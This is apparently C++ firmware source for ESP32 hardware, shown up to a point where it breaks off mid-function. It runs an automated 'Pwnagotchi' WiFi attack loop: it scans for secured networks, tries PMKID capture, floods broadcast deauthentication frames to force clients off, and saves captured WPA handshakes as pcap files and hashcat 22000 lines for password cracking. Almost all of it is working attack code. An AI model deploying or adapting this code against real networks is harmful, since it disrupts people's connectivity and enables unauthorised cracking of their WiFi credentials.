#include <vector>
#include <vector>
#include <map>
#include "WiFi.h"
#include "esp_wifi.h"
#include "settings.h"
#include "mood.h"
#include "newPwnagotchi.h"

// ==========================================
// GLOBALS
// ==========================================

std::vector<wifiRTResults> g_wifiRTResults;
wifiRTResults ap;
SemaphoreHandle_t wifiResultsMutex = nullptr;
const int networkTimeout = 10000;

// EAPOL sniffer
struct CapturedPacket {
    size_t   len;
    uint8_t *data;
    uint32_t ts_sec;
    uint32_t ts_usec;
};

struct FileWriteRequest {
    char     filename[64];
    uint8_t *beaconFrame;
    uint16_t beaconFrameLen;
    uint32_t beaconTs_sec;
    uint32_t beaconTs_usec;
    std::vector<CapturedPacket*> packets;
    String   ssid;
    uint8_t  bssid[6];
    uint8_t  clientMac[6];   // client MAC observed in handshake (for hashcat)
    uint8_t  anonce[32];     // ANonce from EAPOL Msg1
    uint8_t  snonce[32];     // SNonce from EAPOL Msg2
    uint8_t  mic[16];        // MIC from EAPOL Msg2
    bool     hasAnonce;
    bool     hasSnonce;
    bool     hasMic;
};

// BUG FIX: was "const uint8_t*" which conflicts with malloc assignment
static uint8_t *beaconFrame    = nullptr;
static uint16_t beaconFrameLen = 0;
static bool     beaconDetected = false;

static bool    targetAPSet = false;
static uint8_t targetBSSID[6];
static uint8_t eapolCount = 0;
static bool    eapolMsg[5] = {false};

// Nonce / MIC capture (for hashcat output)
static uint8_t capturedANonce[32];
static uint8_t capturedSNonce[32];
static uint8_t capturedMIC[16];
static uint8_t capturedClientMac[6];
static bool    hasANonce = false;
static bool    hasSNonce = false;
static bool    hasMIC    = false;

QueueHandle_t packetQueue    = nullptr;
QueueHandle_t fileWriteQueue = nullptr;
TaskHandle_t  pwnagotchiTaskHandle = nullptr;
bool          pwnagotchiRunning    = false;

std::vector<String> pwnedAPs;
std::vector<String> failedClients;

// PCAP structures
struct pcap_hdr_s {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} __attribute__((packed));

struct pcaprec_hdr_s {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} __attribute__((packed));

File file;

// ==========================================
// HELPERS
// ==========================================

bool networkStillExists(const String& ssid, int channel) {
    if (wifiResultsMutex == nullptr) return false;
    if (xSemaphoreTake(wifiResultsMutex, 0) != pdTRUE) return false;
    bool found = false;
    for (const auto& entry : g_wifiRTResults) {
        if (entry.ssid == ssid && entry.channel == channel) {
            if (millis() - entry.lastSeen <= networkTimeout) found = true;
            break;
        }
    }
    xSemaphoreGive(wifiResultsMutex);
    return found;
}

bool isHandshakeComplete() {
    return (eapolMsg[1] && eapolMsg[2] && eapolMsg[3] && eapolMsg[4]);
}

static inline int ieee80211_hdrlen(uint16_t fc) {
    int hdrlen = 24;
    uint8_t type    = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    if (type == 2) {
        if ((fc & 0x0300) == 0x0300) hdrlen += 6; // 4-addr frame
        if (subtype & 0x08)          hdrlen += 2; // QoS
    }
    if (fc & 0x8000) hdrlen += 4; // HT control
    return hdrlen;
}

// ==========================================
// EAPOL PARSER
// EAPOL-Key frame layout (after LLC/SNAP):
//   0  version
//   1  type (3 = EAPOL-Key)
//   2  length (2 bytes, big-endian)
//   4  key descriptor type (2 = RSN)
//   5  key info high byte
//   6  key info low byte
//   7  key length (2 bytes)
//   9  replay counter (8 bytes)
//  17  ANonce (32 bytes)
//  49  key IV (16 bytes)
//  65  key RSC (8 bytes)
//  73  reserved (8 bytes)
//  81  MIC (16 bytes)
//  97  key data length (2 bytes)
//  99  key data
// ==========================================

#define EAPOL_KEY_TYPE_OFFSET   4
#define EAPOL_KEY_INFO_HI       5
#define EAPOL_KEY_INFO_LO       6
#define EAPOL_ANONCE_OFFSET    17
#define EAPOL_MIC_OFFSET       81
#define EAPOL_SNONCE_OFFSET    17  // SNonce is at the same offset in Msg2

uint8_t getEAPOLOrder(uint8_t *buf, size_t buf_len) {
    if (buf == nullptr || buf_len < 32) return 0;

    uint16_t fc     = buf[0] | (buf[1] << 8);
    int      hdrlen = ieee80211_hdrlen(fc);
    if (hdrlen < 24 || hdrlen > 40) return 0;
    if ((int)buf_len < hdrlen + 18) return 0;

    const uint8_t *llc = buf + hdrlen;
    if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
          llc[3]==0x00 && llc[4]==0x00 && llc[5]==0x00 &&
          llc[6]==0x88 && llc[7]==0x8E)) return 0;

    const uint8_t *eapol = llc + 8;
    int eapol_len = (int)buf_len - hdrlen - 8;

    // Packet type must be EAPOL-Key (3)
    if (eapol[1] != 3) return 0;
    // Key descriptor type must be RSN (2)
    if (eapol_len > EAPOL_KEY_TYPE_OFFSET && eapol[EAPOL_KEY_TYPE_OFFSET] != 2) return 0;

    if (eapol_len < EAPOL_KEY_INFO_LO + 1) return 0;
    uint16_t key_info = ((uint16_t)eapol[EAPOL_KEY_INFO_HI] << 8) | eapol[EAPOL_KEY_INFO_LO];

    bool mic     = key_info & (1 << 8);
    bool ack     = key_info & (1 << 7);
    bool install = key_info & (1 << 6);
    bool secure  = key_info & (1 << 9);

    uint8_t msgNum = 0;
    if      (!mic &&  ack && !install && !secure) msgNum = 1;
    else if ( mic && !ack && !install && !secure) msgNum = 2;
    else if ( mic &&  ack &&  install &&  secure) msgNum = 3;
    else if ( mic && !ack && !install &&  secure) msgNum = 4;

    if (msgNum == 0) {
        fLogMessage("Unknown EAPOL key_info=0x%04X", key_info);
        return 0;
    }

    // Capture ANonce from Msg1, SNonce+MIC from Msg2
    if (msgNum == 1 && eapol_len >= EAPOL_ANONCE_OFFSET + 32) {
        memcpy(capturedANonce, eapol + EAPOL_ANONCE_OFFSET, 32);
        hasANonce = true;

        // Capture source address (AP MAC) — addr2 for ToDS=0,FromDS=1 (AP→STA)
        // In practice, for Msg1, addr2 is the AP
        // We grab the client (STA) MAC from addr1 for use in hashcat
        memcpy(capturedClientMac, buf + 4, 6); // addr1 = DA = client
    }
    if (msgNum == 2 && eapol_len >= EAPOL_MIC_OFFSET + 16) {
        memcpy(capturedSNonce, eapol + EAPOL_SNONCE_OFFSET, 32);
        memcpy(capturedMIC,    eapol + EAPOL_MIC_OFFSET,    16);
        hasSNonce = true;
        hasMIC    = true;
    }

    logMessage("EAPOL Message " + String(msgNum) + " detected");
    return msgNum;
}

// ==========================================
// PROMISCUOUS CALLBACK
// ==========================================

void wifiRTScanCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt == nullptr) return;

    uint16_t       len     = pkt->rx_ctrl.sig_len;
    const uint8_t *payload = pkt->payload;
    int8_t         rssi    = pkt->rx_ctrl.rssi;
    uint8_t        channel = pkt->rx_ctrl.channel;
    uint8_t        bssid[6];
    memcpy(bssid, payload + 10, 6);

    // ---- MGMT frames: scan & beacon detection ----
    if (type == WIFI_PKT_MGMT) {
        // Read actual channel from DS Parameter Set IE
        uint8_t ap_channel = channel;
        if (pkt->rx_ctrl.sig_len > 36) {
            int pos_ch = 36;
            while (pos_ch + 2 <= (int)pkt->rx_ctrl.sig_len - 1) {
                uint8_t tag     = pkt->payload[pos_ch];
                uint8_t len_tag = pkt->payload[pos_ch + 1];
                if (pos_ch + 2 + len_tag > (int)pkt->rx_ctrl.sig_len) break;
                if (tag == 3 && len_tag == 1) { ap_channel = pkt->payload[pos_ch + 2]; break; }
                pos_ch += 2 + len_tag;
            }
        }
        channel = ap_channel;

        uint16_t cap    = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
        bool     secure = (cap & 0x0010) != 0;

        String ssid = "";
        int    pos  = 36;
        while (pos + 2 < (int)pkt->rx_ctrl.sig_len) {
            uint8_t tag     = payload[pos];
            uint8_t len_tag = payload[pos + 1];
            if (pos + 2 + len_tag > (int)pkt->rx_ctrl.sig_len) break;
            if (tag == 0 && len_tag <= 32) {
                ssid = String((char *)(payload + pos + 2), len_tag);
                break;
            }
            pos += 2 + len_tag;
        }
        if (ssid.length() == 0) return;

        wifiRTResults newResult = { ssid, rssi, channel, secure,
            {bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]}, millis() };

        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, 0) == pdTRUE) {
            bool dup = false;
            for (auto &entry : g_wifiRTResults) {
                if (entry.ssid == ssid && entry.channel == channel) {
                    entry.rssi     = rssi;
                    entry.lastSeen = millis();
                    dup = true;
                    break;
                }
            }
            if (!dup) g_wifiRTResults.push_back(newResult);

            g_wifiRTResults.erase(std::remove_if(g_wifiRTResults.begin(), g_wifiRTResults.end(),
                [](const wifiRTResults &e) { return millis() - e.lastSeen > 5000; }),
                g_wifiRTResults.end());
            xSemaphoreGive(wifiResultsMutex);
        }

        // Beacon detection for targeted AP
        if (len < 24) return;
        uint16_t fc      = payload[0] | (payload[1] << 8);
        uint8_t  ftype   = (fc >> 2) & 0x3;
        uint8_t  fsubtype = (fc >> 4) & 0xF;

        if (ftype == 0 && fsubtype == 8 && !beaconDetected) {
            if (targetAPSet && memcmp(payload + 16, targetBSSID, 6) != 0) return;
            uint16_t beaconLen = (len > 4) ? len - 4 : len;
            uint8_t *fb = (uint8_t *)malloc(beaconLen);
            if (!fb) return;
            memcpy(fb, payload, beaconLen);
            beaconFrame    = fb;
            beaconFrameLen = beaconLen;
            beaconDetected = true;
            logMessage("Beacon frame captured.");
        }
        return;
    }

    // ---- DATA frames: EAPOL capture ----
    if (type == WIFI_PKT_DATA) {
        if (ap.ssid.length() == 0)              return;
        if (!beaconDetected || !beaconFrame)    return;

        uint16_t fc     = payload[0] | (payload[1] << 8);
        int      hdrlen = ieee80211_hdrlen(fc);
        if ((int)len < hdrlen + 8) return;

        const uint8_t *llc = payload + hdrlen;
        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
              llc[6]==0x88 && llc[7]==0x8E)) return;

        // Correct BSSID extraction based on ToDS/FromDS bits
        bool toDS   = (fc >> 8) & 0x01;
        bool fromDS = (fc >> 8) & 0x02;  // BUG FIX: was (fc >> 8) & 0x02 — correct
        const uint8_t *pktBSSID;
        if      ( toDS && !fromDS) pktBSSID = payload + 4;
        else if (!toDS &&  fromDS) pktBSSID = payload + 10;
        else                       pktBSSID = payload + 16;

        if (memcmp(pktBSSID, targetBSSID, 6) != 0) return;

        uint8_t msgNum = getEAPOLOrder((uint8_t *)payload, len);
        if (msgNum >= 1 && msgNum <= 4) eapolMsg[msgNum] = true;

        // BUG FIX: removed duplicate bounds check that appeared twice
        if (len == 0 || len > MAX_PKT_SIZE) return;

        CapturedPacket *p = (CapturedPacket *)malloc(sizeof(CapturedPacket));
        if (!p) return;
        p->data = (uint8_t *)malloc(len);
        if (!p->data) { free(p); return; }

        memcpy(p->data, payload, len);
        p->len = len;

        uint64_t ts = esp_timer_get_time();
        p->ts_sec  = ts / 1000000;
        p->ts_usec = ts % 1000000;

        BaseType_t woken = pdFALSE;
        if (xQueueSendFromISR(packetQueue, &p, &woken) != pdTRUE) {
            free(p->data);
            free(p);
        } else if (woken) {
            portYIELD_FROM_ISR();
        }
    }
}

// ==========================================
// HASHCAT FILE WRITER
// Writes a WPA*02 hashcat-compatible line (mode 22000).
// Format: WPA*02*MIC*APmac*STAmac*SSID*ANonce*EAPOL2raw*[messagepair]
//
// Since we have separate ANonce (Msg1) and the full Msg2 EAPOL frame
// in our captured packets, we use the simplified hccapx-equivalent line.
// hashcat -m 22000 accepts this format directly.
// ==========================================

static void writeHashcatFile(FileWriteRequest *req) {
    if (!req->hasAnonce || !req->hasMic || !req->hasSnonce) {
        logMessage("[Hashcat] Missing nonces/MIC, skipping hashcat file.");
        return;
    }

    // Build hashcat filename from pcap filename (replace .pcap → .hc22000)
    char hcFilename[80];
    strncpy(hcFilename, req->filename, sizeof(hcFilename) - 1);
    hcFilename[sizeof(hcFilename) - 1] = '\0';
    char *dot = strrchr(hcFilename, '.');
    if (dot) strcpy(dot, ".hc22000");
    else     strncat(hcFilename, ".hc22000", sizeof(hcFilename) - strlen(hcFilename) - 1);

    // Find the raw EAPOL Msg2 packet from our captured list
    // We'll embed it as a hex blob in the hashcat line.
    // Locate Msg2 by re-parsing stored packets.
    const uint8_t *eapol2Raw    = nullptr;
    uint16_t eapol2RawLen = 0;

    for (auto *pkt : req->packets) {
        if (!pkt || !pkt->data) continue;
        uint16_t fc      = pkt->data[0] | (pkt->data[1] << 8);
        int      hdrlen  = ieee80211_hdrlen(fc);
        if ((int)pkt->len < hdrlen + 8) continue;

        const uint8_t *llc = pkt->data + hdrlen;
        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
              llc[6]==0x88 && llc[7]==0x8E)) continue;

        const uint8_t *eapol    = llc + 8;
        int            eapolLen = (int)pkt->len - hdrlen - 8;
        if (eapolLen < 8) continue;
        if (eapol[1] != 3) continue; // Not EAPOL-Key

        uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
        bool mic     = key_info & (1 << 8);
        bool ack     = key_info & (1 << 7);
        bool install = key_info & (1 << 6);
        bool secure  = key_info & (1 << 9);

        if (mic && !ack && !install && !secure) { // Msg2
            eapol2Raw    = eapol;
            eapol2RawLen = (uint16_t)eapolLen;
            break;
        }
    }

    if (!eapol2Raw || eapol2RawLen == 0) {
        logMessage("[Hashcat] Could not locate raw EAPOL Msg2, skipping.");
        return;
    }

    // Helper lambda: bytes → hex string into a fixed buffer
    auto toHex = [](const uint8_t *src, int len, char *dst) {
        for (int i = 0; i < len; i++) sprintf(dst + i * 2, "%02x", src[i]);
        dst[len * 2] = '\0';
    };

    // Format MAC as 12-char lowercase hex (no colons)
    char apMacHex[13], staMacHex[13], ssidHex[65];
    char anonceHex[65], snonceHex[65], micHex[33];

    // AP MAC from BSSID, STA MAC from capturedClientMac
    toHex(req->bssid,       6,               apMacHex);
    toHex(req->clientMac,   6,               staMacHex);
    toHex((uint8_t*)req->ssid.c_str(), req->ssid.length(), ssidHex);
    toHex(req->anonce,      32,              anonceHex);
    toHex(req->snonce,      32,              snonceHex);
    toHex(req->mic,         16,              micHex);

    // EAPOL2 raw hex — dynamically allocate since it can be large
    char *eapol2Hex = (char *)malloc(eapol2RawLen * 2 + 1);
    if (!eapol2Hex) {
        logMessage("[Hashcat] malloc failed for eapol2Hex");
        return;
    }
    toHex(eapol2Raw, eapol2RawLen, eapol2Hex);

    File hcFile = FSYS.open(hcFilename, FILE_WRITE, true);
    if (!hcFile) {
        logMessage("[Hashcat] Failed to open: " + String(hcFilename));
        free(eapol2Hex);
        return;
    }

    // WPA*02*<MIC>*<APmac>*<STAmac>*<SSID_hex>*<ANonce>*<EAPOL2_hex>*02
    // messagepair=02 means: ANonce from Msg1, EAPOL from Msg2
    hcFile.printf("WPA*02*%s*%s*%s*%s*%s*%s*02\n",
        micHex, apMacHex, staMacHex, ssidHex, anonceHex, eapol2Hex);

    hcFile.close();
    logMessage("[Hashcat] Written: " + String(hcFilename));
    free(eapol2Hex);
}

// ==========================================
// FILE WRITER (called from main/task loop)
// ==========================================

void handleFileWrite(FileWriteRequest *req) {
    if (!req) return;
    logMessage("[FileWriter] Writing PCAP for: " + req->ssid);

    if (!FSYS.exists("/handshake")) {
        FSYS.mkdir("/handshake");
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    File f = FSYS.open(req->filename, FILE_WRITE, true);
    if (!f) {
        logMessage("[FileWriter] ERROR: Failed to open: " + String(req->filename));
        goto cleanup;
    }

    {
        // Global PCAP header
        pcap_hdr_s gh;
        gh.magic_number  = 0xa1b2c3d4;
        gh.version_major = 2;
        gh.version_minor = 4;
        gh.thiszone      = 0;
        gh.sigfigs       = 0;
        gh.snaplen       = 65535;
        gh.network       = 105; // LINKTYPE_IEEE802_11
        f.write((uint8_t *)&gh, sizeof(gh));
        f.flush();

        // Beacon frame
        if (req->beaconFrame && req->beaconFrameLen > 0) {
            pcaprec_hdr_s rh;
            rh.ts_sec  = req->beaconTs_sec;
            rh.ts_usec = req->beaconTs_usec;
            rh.incl_len = rh.orig_len = req->beaconFrameLen;
            f.write((uint8_t *)&rh, sizeof(rh));
            f.write(req->beaconFrame, req->beaconFrameLen);
            f.flush();
        }

        // EAPOL packets
        for (auto *pkt : req->packets) {
            if (!pkt || !pkt->data) continue;
            pcaprec_hdr_s rh;
            rh.ts_sec  = pkt->ts_sec;
            rh.ts_usec = pkt->ts_usec;
            rh.incl_len = rh.orig_len = pkt->len;
            f.write((uint8_t *)&rh, sizeof(rh));
            f.write(pkt->data, pkt->len);
            f.flush();
        }

        f.close();
        logMessage("[FileWriter] PCAP closed: " + String(req->filename));
    }

    // Write hashcat file alongside the PCAP
    writeHashcatFile(req);

cleanup:
    if (req->beaconFrame) free(req->beaconFrame);
    for (auto *pkt : req->packets) {
        if (pkt && pkt->data) free(pkt->data);
        if (pkt) free(pkt);
    }
    req->packets.clear();
    delete req;
}

// ==========================================
// BEGIN / END
// ==========================================

bool n_pwnagotchi::begin() {
    logMessage("Initializing Pwnagotchi mode...");

    if (wifiResultsMutex == nullptr) {
        wifiResultsMutex = xSemaphoreCreateMutex();
        if (!wifiResultsMutex) { logMessage("Failed to create mutex!"); return false; }
    }
    if (packetQueue == nullptr) {
        packetQueue = xQueueCreate(10, sizeof(CapturedPacket *));
        if (!packetQueue) { logMessage("Failed to create packetQueue!"); return false; }
    }
    if (fileWriteQueue == nullptr) {
        fileWriteQueue = xQueueCreate(5, sizeof(FileWriteRequest *));
        if (!fileWriteQueue) { logMessage("Failed to create fileWriteQueue!"); return false; }
    }

    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
    esp_wifi_set_promiscuous(true);

    pwnagotchiRunning = true;
    BaseType_t r = xTaskCreatePinnedToCore(task, "PwnagotchiTask", 8192*6, NULL, 1, &pwnagotchiTaskHandle, 1);
    if (r != pdPASS) {
        logMessage("Failed to create Pwnagotchi task!");
        pwnagotchiRunning = false;
        esp_wifi_set_promiscuous(false);
        return false;
    }
    logMessage("Pwnagotchi started.");
    return true;
}

bool n_pwnagotchi::end() {
    logMessage("Stopping Pwnagotchi...");

    // ── 1. Signal task to stop and delete it ─────────────────────────────────
    pwnagotchiRunning = false;

    if (pwnagotchiTaskHandle != nullptr) {
        vTaskDelete(pwnagotchiTaskHandle);
        pwnagotchiTaskHandle = nullptr;
        logMessage("[end] Task deleted.");
    }

    // ── 2. Stop promiscuous mode ──────────────────────────────────────────────
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    logMessage("[end] Promiscuous mode disabled.");

    // ── 3. Drain & delete packetQueue ─────────────────────────────────────────
    // The ISR is now stopped (promiscuous off), so no new items can arrive.
    if (packetQueue != nullptr) {
        CapturedPacket *p = nullptr;
        while (xQueueReceive(packetQueue, &p, 0) == pdTRUE) {
            if (p != nullptr) {
                if (p->data != nullptr) { free(p->data); p->data = nullptr; }
                free(p);
            }
        }
        vQueueDelete(packetQueue);
        packetQueue = nullptr;
        logMessage("[end] packetQueue drained and deleted.");
    }

    // ── 4. Drain & delete fileWriteQueue ──────────────────────────────────────
    // Each FileWriteRequest owns: beaconFrame (malloc), packets vector of
    // CapturedPacket* (each with malloc'd data), and a std::vector itself.
    if (fileWriteQueue != nullptr) {
        FileWriteRequest *req = nullptr;
        while (xQueueReceive(fileWriteQueue, &req, 0) == pdTRUE) {
            if (req != nullptr) {
                // Free beacon frame
                if (req->beaconFrame != nullptr) {
                    free(req->beaconFrame);
                    req->beaconFrame = nullptr;
                }
                // Free each captured packet inside the request
                for (CapturedPacket *pkt : req->packets) {
                    if (pkt != nullptr) {
                        if (pkt->data != nullptr) { free(pkt->data); pkt->data = nullptr; }
                        free(pkt);
                    }
                }
                req->packets.clear();
                // String members (ssid) are destroyed by the destructor when we delete
                delete req;
            }
        }
        vQueueDelete(fileWriteQueue);
        fileWriteQueue = nullptr;
        logMessage("[end] fileWriteQueue drained and deleted.");
    }

    // ── 5. Free beacon frame held by the sniffer ─────────────────────────────
    if (beaconFrame != nullptr) {
        free(beaconFrame);
        beaconFrame    = nullptr;
        beaconFrameLen = 0;
    }
    beaconDetected = false;
    logMessage("[end] Beacon state cleared.");

    // ── 6. Close any open SD file ─────────────────────────────────────────────
    if (file) {
        file.close();
        logMessage("[end] Open file closed.");
    }

    // ── 7. Clear tracking state ───────────────────────────────────────────────
    targetAPSet = false;
    memset(targetBSSID,       0, sizeof(targetBSSID));
    eapolCount = 0;
    memset(eapolMsg,          0, sizeof(eapolMsg));

    // Nonce / MIC globals
    hasANonce = false;
    hasSNonce = false;
    hasMIC    = false;
    memset(capturedANonce,    0, sizeof(capturedANonce));
    memset(capturedSNonce,    0, sizeof(capturedSNonce));
    memset(capturedMIC,       0, sizeof(capturedMIC));
    memset(capturedClientMac, 0, sizeof(capturedClientMac));
    logMessage("[end] EAPOL / nonce state cleared.");

    // ── 8. Reset the global target AP struct ─────────────────────────────────
    // wifiRTResults contains a String (ssid) — assigning a default-constructed
    // one invokes the String destructor and releases its heap buffer.
    ap = wifiRTResults{};
    logMessage("[end] Target AP struct cleared.");

    // ── 9. Clear tracking vectors ─────────────────────────────────────────────
    // These hold std::string / Arduino String objects whose destructors
    // release the underlying heap buffers automatically on clear().
    pwnedAPs.clear();
    pwnedAPs.shrink_to_fit();      // release vector capacity back to heap

    failedClients.clear();
    failedClients.shrink_to_fit();
    logMessage("[end] pwnedAPs and failedClients cleared.");

    // ── 10. Clear the scan results (under mutex, then destroy mutex) ──────────
    if (wifiResultsMutex != nullptr) {
        if (xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            g_wifiRTResults.clear();
            g_wifiRTResults.shrink_to_fit();
            xSemaphoreGive(wifiResultsMutex);
        }
        vSemaphoreDelete(wifiResultsMutex);
        wifiResultsMutex = nullptr;
        logMessage("[end] g_wifiRTResults cleared, mutex deleted.");
    }

    logMessage("Pwnagotchi fully stopped and all memory released.");
    return true;
}

// ==========================================
// TASK
// ==========================================

#include "PMKIDGrabber.h"
#include "pwnagothi.h"

void task(void *parameter) {
    auto whitelist = parseWhitelist();
    while (pwnagotchiRunning) {
        // Drain any pending file write requests first (BUG FIX: queue was never drained)
        // {
        //     FileWriteRequest *req = nullptr;
        //     while (xQueueReceive(fileWriteQueue, &req, 0) == pdTRUE) {
        //         if (req) handleFileWrite(req);
        //     }
        // }

        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            std::vector<wifiRTResults> localResults = g_wifiRTResults;
            xSemaphoreGive(wifiResultsMutex);

            for (auto &network : localResults) {
                if (!pwnagotchiRunning) break;
                if (std::find(whitelist.begin(), whitelist.end(), network.ssid) != whitelist.end()) {
                    logMessage("Skipping " + network.ssid + " - whitelisted.");
                    continue;
                }
                ap = network;
                if (!networkStillExists(network.ssid, network.channel)) {
                    logMessage("Skipping " + network.ssid + " - no longer visible.");
                    continue;
                }
                unsigned long t0 = millis();
                attackTask(nullptr);
                logMessage("Attack on " + network.ssid + " done in " + String(millis()-t0) + "ms");
                ap = {"", 0, 0, false};
            }

            // Channel hop
            if (wifiMutex) {
                xSemaphoreTake(wifiMutex, portMAX_DELAY);
                uint8_t ch;
                esp_wifi_get_channel(&ch, nullptr);
                ch = (ch % 13) + 1;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                xSemaphoreGive(wifiMutex);
                logMessage("Hopped to channel " + String(ch));
            }
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    vTaskDelete(NULL);
}

// ==========================================
// ATTACK TASK
// ==========================================

void attackTask(void *parameter) {
    if (!ap.secure) return;

    for (const auto &s : pwnedAPs)     if (s == ap.ssid) return;
    // for (const auto &s : failedClients) {
    //     if (s == ap.ssid) {
    //         logMessage("Skipping " + ap.ssid + " - no clients previously.");
    //         return;
    //     }
    // }
    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " gone before attack.");
        return;
    }

    logMessage("Attacking: " + ap.ssid);

    // --- Phase 1: PMKID ---
    logMessage("PMKID attack on: " + ap.ssid);
    if (runPMKIDAttack(ap.bssid, ap.channel)) {
        logMessage("PMKID success: " + ap.ssid);
        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
            pwnedAPs.push_back(ap.ssid);
        pwned_ap++;
        sessionCaptures++;
        
        if (pwnagotchi.sound_on_events) {
            delay(100); M5.Speaker.tone(1500,100);
            delay(100); M5.Speaker.tone(2000,100);
            delay(100); M5.Speaker.tone(2500,150); delay(150);
        }
        return;
    }
    logMessage("PMKID failed: " + ap.ssid);

    // --- Phase 2: EAPOL handshake ---
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(100 / portTICK_PERIOD_MS);
    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);

    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " gone before EAPOL phase.");
        return;
    }

    logMessage("EAPOL capture on: " + ap.ssid);
    targetAPSet = true;
    memcpy(targetBSSID, ap.bssid, 6);
    for (int i = 0; i < 5; i++) eapolMsg[i] = false;
    hasANonce = hasSNonce = hasMIC = false;

    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
        ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5],
        0x00,0x00, 0x01,0x00
    };

    // Send initial deauth burst
    uint16_t deauthCount = 0;
    for (uint16_t i = 0; i < 120; i++) {
        if ((i % 30) == 0 && i > 0) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network gone during deauth after " + String(deauthCount) + " pkts.");
                targetAPSet = false;
                return;
            }
        }
        xSemaphoreTake(wifiMutex, portMAX_DELAY);
        if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false) == ESP_OK)
            deauthCount++;
        xSemaphoreGive(wifiMutex);
    }
    logMessage("Deauth sent: " + String(deauthCount) + " to " + ap.ssid);

    // Wait for handshake, keep sending deauth
    unsigned long startTime = millis();
    const unsigned long EAPOL_TIMEOUT = 15000;

    while (!isHandshakeComplete() && millis() - startTime < EAPOL_TIMEOUT) {
        if ((millis() - startTime) % 1000 < 100) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network gone during EAPOL wait.");
                targetAPSet = false;
                return;
            }
        }
        // BUG FIX: protect deauth tx in wait loop with mutex
        xSemaphoreTake(wifiMutex, portMAX_DELAY);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        xSemaphoreGive(wifiMutex);
        vTaskDelay(70 / portTICK_PERIOD_MS);
    }

    if (isHandshakeComplete()) {
        logMessage("Handshake captured for: " + ap.ssid + " in " + String(millis()-startTime) + "ms");
        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
            pwnedAPs.push_back(ap.ssid);

        vTaskDelay(1000 / portTICK_PERIOD_MS);
        eapolCount = 0;
        for (int i = 0; i < 5; i++) eapolMsg[i] = false;

        FileWriteRequest *req = new FileWriteRequest();
        if (!req) { logMessage("ERR: alloc FileWriteRequest failed"); targetAPSet = false; return; }

        // Filename
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X_%02X_%02X_%02X_%02X_%02X",
            ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]);
        snprintf(req->filename, sizeof(req->filename), "/handshake/%s_%s_ID_%i.pcap",
            bssidStr, ap.ssid.c_str(), random(999));

        req->ssid = ap.ssid;
        memcpy(req->bssid,      ap.bssid,          6);
        memcpy(req->clientMac,  capturedClientMac,  6);
        memcpy(req->anonce,     capturedANonce,     32);
        memcpy(req->snonce,     capturedSNonce,     32);
        memcpy(req->mic,        capturedMIC,        16);
        req->hasAnonce = hasANonce;
        req->hasSnonce = hasSNonce;
        req->hasMic    = hasMIC;

        // Beacon
        if (beaconDetected && beaconFrame && beaconFrameLen > 0) {
            req->beaconFrame = (uint8_t *)malloc(beaconFrameLen);
            if (req->beaconFrame) {
                memcpy(req->beaconFrame, beaconFrame, beaconFrameLen);
                req->beaconFrameLen = beaconFrameLen;
                uint64_t ts = esp_timer_get_time();
                req->beaconTs_sec  = ts / 1000000;
                req->beaconTs_usec = ts % 1000000;
            }
        }

        // Drain packet queue into request
        CapturedPacket *pkt = nullptr;
        while (xQueueReceive(packetQueue, &pkt, 10 / portTICK_PERIOD_MS) == pdTRUE)
            if (pkt) req->packets.push_back(pkt);

        logMessage("Queuing " + String(req->packets.size()) + " pkts for write.");

        if (fileWriteQueue && xQueueSend(fileWriteQueue, &req, portMAX_DELAY) != pdTRUE) {
            logMessage("ERR: fileWriteQueue send failed");
            if (req->beaconFrame) free(req->beaconFrame);
            for (auto *p : req->packets) { if (p && p->data) free(p->data); if (p) free(p); }
            req->packets.clear();
            delete req;
            targetAPSet = false;
            return;
        }

        pwned_ap++;
        sessionCaptures++;
        
        if (pwnagotchi.sound_on_events) {
            delay(100); M5.Speaker.tone(1500,100);
            delay(100); M5.Speaker.tone(2000,100);
            delay(100); M5.Speaker.tone(2500,150); delay(150);
        }
